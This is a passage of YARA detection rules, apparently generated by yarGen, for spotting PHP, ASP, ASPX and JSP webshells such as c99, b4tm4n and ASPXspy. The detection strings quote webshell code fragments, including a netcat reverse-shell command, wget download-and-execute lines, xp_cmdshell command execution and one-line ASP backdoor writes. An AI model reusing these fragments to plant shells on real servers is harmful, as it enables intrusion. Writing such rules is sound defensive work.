      $s11 = "execute(\"tar xf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s12 = "ngs.mimeType||xhr.getResponseHeader(\"content-type\")),result=xhr.responseText;try{dataType==\"script\"?(1,eval)(result):dataTyp" ascii
      $s13 = "execute(\"tar xzf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s14 = "src:url(data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAGkYAA8AAAAAp+gAAQABAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABWA" ascii
      $s15 = "/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */" fullword ascii
      $s16 = "$check = strtolower(execute(\"ruby -h\"));" fullword ascii
      $s17 = "$check = strtolower(execute(\"java -help\"));" fullword ascii
      $s18 = "$check = strtolower(execute(\"python -h\"));" fullword ascii
      $s19 = "$buff = execute(\"lwp-download \".$url.\" \".$saveas);" fullword ascii
      $s20 = "$check = strtolower(execute(\"javac -help\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c99_locus7s_1 {
   meta:
      description = "webshell - from files c99_PSych0.php, c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $x1 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x2 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x3 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s4 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii
      $s5 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii
      $s6 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $s7 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s8 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $s9 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s10 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) " fullword ascii
      $s11 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s12 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
      $s13 = "<b>Bind With Backd00r Burner</b></br><form action=\"<?php echo $surl;?>\"><input type=hidden name=act value=tools><select size=" ascii
      $s14 = "     echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with lo" ascii
      $s15 = "     else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");} " fullword ascii
      $s16 = " else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}} " fullword ascii
      $s17 = " if (!$sql_sock) {?><td width=\"28%\" height=\"100\" valign=\"top\"><center><font size=\"5\"> i </font></center><li>If login is " ascii
      $s18 = "if (trim($cmd) == \"ps -aux\") {$act = \"processes\";} " fullword ascii
      $s19 = "   echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\".substr(decoct(fileperms($d.$f)),-4,4).\")</b><b" ascii
      $s20 = "\\\" name=dolma><option value=\"wgetcan\">Use Wget</option><option value=\"lynxcan\">Use lynx -dump</option><option value=\"frea" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _bat_b4tm4n_bat_2_7_asw_bat_2 {
   meta:
      description = "webshell - from files bat_b4tm4n.php, bat_2.7.php, asw.php, bat.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "591efefbc046698998c618234d7ff702b65a9ef7e12cd74980558fb9d0350e98"
      hash2 = "d0197a3e0134bd5ef63d5a2b7699f6aa8403c94251ff33c88c9d1c2c83c0e335"
      hash3 = "88f4bed46b4e8ba8237edb2374a1bef7a252a01a54836ead82b5c7e989c12411"
      hash4 = "23169d2107567f31b9cde9d04b8a9aeee99c34dc3261c81fd7a897a603ec4606"
   strings:
      $x1 = " * [Usage] http://website.com/shell.php?x=self-encryptor&name=shell_encrypt.php" fullword ascii
      $x2 = "]?[\\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1])" ascii
      $s3 = "$kill=Execute(\"taskkill /f /pid $pid\");" fullword ascii
      $s4 = "$kill=Execute(\"taskkill /f /im $name\");" fullword ascii
      $s5 = "$ret=iconv($charset,'UTF-8',Execute($command));" fullword ascii
      $s6 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s7 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s8 = "<label>Target</label><input type=\"text\" id=\"target\" value=\"http://www.target.com\"><br>" fullword ascii
      $s9 = "$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';" fullword ascii
      $s10 = "        fwrite($sock,Execute($command));" fullword ascii
      $s11 = "'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open'," fullword ascii
      $s12 = "       fwrite($sock,Execute($command));" fullword ascii
      $s13 = "remote_addr,Execute('whoami') " fullword ascii
      $s14 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s15 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s16 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s17 = "<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s18 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s19 = "<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s20 = " * Self Script Encryptor v1.0" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01_ASP_NET_Web_BackDoor_3 {
   meta:
      description = "webshell - from files 01.aspx, ASP.NET Web BackDoor.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac6ae000d13f06fd4a0f87af57a2dcc4559fc5d5aa4cc7a1606139ffa85cf473"
      hash2 = "579e0f946f0d165567b7a8e933b6000368480ce09d51042e8753e4b389318dbc"
   strings:
      $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
      $x2 = "                   string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\sys" ascii
      $x3 = "te 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c\" + shellcmd.Text.Trim () + \" > 8617.tmp',0,true;BULK INSERT [" ascii
      $x4 = "               string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EX" ascii
      $x5 = "                   string jksqlstr = \"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacre" ascii
      $x6 = "            string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC " ascii
      $x7 = "ecresultset N''select '''' exec\" + \" master..xp_cmdshell \\\"\" + shellcmd.Text + \">c:\\\\jk.txt\\\"'''''',N''Master'''\" + " ascii
      $x8 = "                   string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\Curr" ascii
      $s9 = "               SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
      $s10 = "        SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
      $s11 = "        getocmd.ExecuteNonQuery();" fullword ascii
      $s12 = "               agentcmd.ExecuteNonQuery();" fullword ascii
      $s13 = "                   string jksqlstrdel = \"DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oameth" ascii
      $s14 = "            getocmd.ExecuteNonQuery();" fullword ascii
      $s15 = "                    getocmd.ExecuteNonQuery();" fullword ascii
      $s16 = "            SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
      $s17 = "                getocmd.ExecuteNonQuery();           " fullword ascii
      $s18 = "                SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
      $s19 = "        string getjknewuser = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=68915\\r\\n-User=jk\\r\\n-Password=mhjk\\r\\n-HomeDi" ascii
      $s20 = "esultset N''select '''' exec\" + \" master..xp_cmdshell \\\"\" + dbcmd.Text  + \">c:\\\\jk.txt\\\"'''''',N''Master'''\" + \" EXE" ascii
   condition:
      ( uint16(0) == 0xbbef and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _myxx1_config_zend_4 {
   meta:
      description = "webshell - from files myxx1.jsp, config.jsp, zend.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash2 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash3 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
   strings:
      $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
      $x4 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
      $s5 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s6 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
      $s8 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
      $s9 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
      $s10 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
      $s11 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
      $s12 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
      $s13 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
      $s14 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"" fullword ascii
      $s15 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
      $s16 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
      $s17 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
      $s18 = "StreamConnector.readFromRemote(targetS, yourS," fullword ascii
      $s19 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
      $s20 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _UnKnown_Vip__1__UnKnown_Vip_5 {
   meta:
      description = "webshell - from files UnKnown Vip (1).asp, UnKnown Vip.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash2 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
   strings:
      $x1 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
      $x2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s3 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
      $s4 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
      $s5 = "Set WFSO = Nothing:End Sub:case\"hiddenshell\":hiddenshell():case \"SetFileText\":SetFileText():Case \"ReadREG\":call ReadREG():" ascii
      $s6 = ";Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err Then" ascii
      $s7 = "rr.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targetip & \":" ascii
      $s8 = "End If:End Sub:Sub step_all(agr):retVal=IsPattern(\"(\\\\|\\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|lo" ascii
      $s9 = "ey}js%jrzxjw%wtwwj%st?.-pttm%%stnyhszK\")):function x(Posturl): dim w: w=\"^w^inhttp.^wi^nhttprequest.5.1\": Posturl=replace(tri" ascii
      $s10 = "Call ws.Run (ShellPath&\" /c \" & DefCmd & \" > \" & szTempFile, 0, True)" fullword ascii
      $s11 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
      $s12 = "Server.CreateObject(\"Scripting.FileSystemObject\").CreateFolder(Left(thePath, i - 1))" fullword ascii
      $s13 = "C.NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remo" ascii
      $s14 = "erongI.xEger~ ttap=nrettaP.xEger~ pxEgeR weN=xEger teS\":ExeCuTe(UZSS(ShiSan)):End Function " fullword ascii
      $s15 = "Server.ScriptTimeout=999999999:Response.Buffer =true:On Error Resume Next:sub ShowErr():If Err Then:RRS\"<br><a href='javascript" ascii
      $s16 = ":cmd /c D:\\web\\" fullword ascii
      $s17 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
      $s18 = "diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|main" ascii
      $s19 = "Server.ScriptTimeout=999999999:Response.Buffer =true:On Error Resume Next:sub ShowErr():If Err Then:RRS\"<br><a href='javascript" ascii
      $s20 = "|article|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Browser_download_ma_jsp_File_browser_3_6 {
   meta:
      description = "webshell - from files Browser.jsp, download.jsp, ma.jsp, jsp_File_browser.jsp, 3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash2 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash3 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash4 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash5 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
   strings:
      $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
      $s2 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " * Command of the shell interpreter and the parameter to run a programm" fullword ascii
      $s4 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
      $s5 = "@param command the command to start the process" fullword ascii
      $s6 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" fullword ascii
      $s7 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
      $s8 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
      $s9 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
      $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
      $s11 = "                request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
      $s12 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
      $s14 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
      $s15 = "* f1.getAbsolutePath().toUpperCase().compareTo(" fullword ascii
      $s16 = "request.setAttribute(\"error\", \"File \" + f.getAbsolutePath()" fullword ascii
      $s17 = " * Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
      $s18 = "*If true, all operations (besides upload and native commands) " fullword ascii
      $s19 = "if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));" fullword ascii
      $s20 = "return sign * tempEndf1.compareTo(tempEndf2);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _view_wso_7 {
   meta:
      description = "webshell - from files view.aspx, wso.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
      hash2 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
   strings:
      $x1 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
      $x2 = "      Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
      $x3 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x4 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x5 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x6 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x7 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
      $x8 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
      $x9 = "response.Write(\"<script>alert('File \" & filename & \" upload success!\\nFile info:\\n\\nClient Path:\" & replace(UpFile.value," ascii
      $x10 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
      $s11 = "ExecuteCommand2(command,tempFile)" fullword ascii
      $s12 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
      $s13 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
      $s14 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
      $s15 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
      $s16 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
      $s17 = "recResult = adoConn.Execute(strQuery) " fullword ascii
      $s18 = "    <td><a href=\"?action=sqlrootkit\" >SqlRootKit.NET </a> - <a href=\"?action=cmd\" >CMD.NET</a> - <a href=\"?action=cmdw32\" " ascii
      $s19 = "  <p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
      $s20 = "'local_copy_of_cmd = Local_dir+\"cmd.exe\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _ASPXspy2_icesword_111_aspx_8 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, icesword.aspx, 111.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
      hash3 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
      hash4 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
      $x3 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x4 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x5 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
      $x6 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
      $x7 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
      $x8 = " echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @o" ascii
      $x9 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
      $s10 = " <input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $s11 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $s12 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID\"].ToString()+\"')\\\">Kill</a>\";" fullword ascii
      $s13 = "e /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);declare" ascii
      $s14 = "Kkvb.ExecuteNonQuery();" fullword ascii
      $s15 = "l')\">Add xp_cmdshell</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')\">Add sp" ascii
      $s16 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
      $s17 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
      $s18 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+\"')\\\">\"+rootkey+\"</a> | \";" fullword ascii
      $s19 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));" fullword ascii
      $s20 = "a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execu" ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_c99_w4cking_Shell__ci___Biz_was_here_c99_9 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "     echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with lo" ascii
      $s2 = "$sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s3 = "  $sqlquicklaunch[] = array(\"Server variables\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".html" ascii
      $s4 = "  $sqlquicklaunch[] = array(\"Processes\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspecial" ascii
      $s5 = "  $sqlquicklaunch[] = array(\"Index\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspecialchar" ascii
      $s6 = "  $sqlquicklaunch[] = array(\"Server-status\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspe" ascii
      $s7 = "     if ($dbms == \"mysql\") {echo \"<a href=\\\"\".$surl.\"act=sql&sql_server=\".htmlspecialchars($dbhost).\"&sql_login=\".html" ascii
      $s8 = "$DISP_SERVER_SOFTWARE = str_replace(\"PHP/\".phpversion(),\"<a href=\\\"\".$surl.\"act=phpinfo\\\" target=\\\"_blank\\\"><b><u>P" ascii
      $s9 = "  $ret = myshellexec($cmdline);" fullword ascii
      $s10 = "  $ret = myshellexec($cmd);" fullword ascii
      $s11 = "  else {echo \"<br><a href=\\\"\".$surl.\"act=security&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s12 = "    $encoded = base64_encode(file_get_contents($d.$f));" fullword ascii
      $s13 = "   header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\");" fullword ascii
      $s14 = "    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));" fullword ascii
      $s15 = "  elseif ($ft == \"sdb\") {echo \"<pre>\"; var_dump(unserialize(base64_decode($r))); echo \"</pre>\";}" fullword ascii
      $s16 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd" fullword ascii
      $s17 = "    if (@ftp_login($sock,$login,$pass))" fullword ascii
      $s18 = " echo \"<b>Processes:</b><br>\";" fullword ascii
      $s19 = "\"sql_act=processes&kill=\".$row[0].\"\\\"><u>Kill</u></a></td></tr>\";}" fullword ascii
      $s20 = "     echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
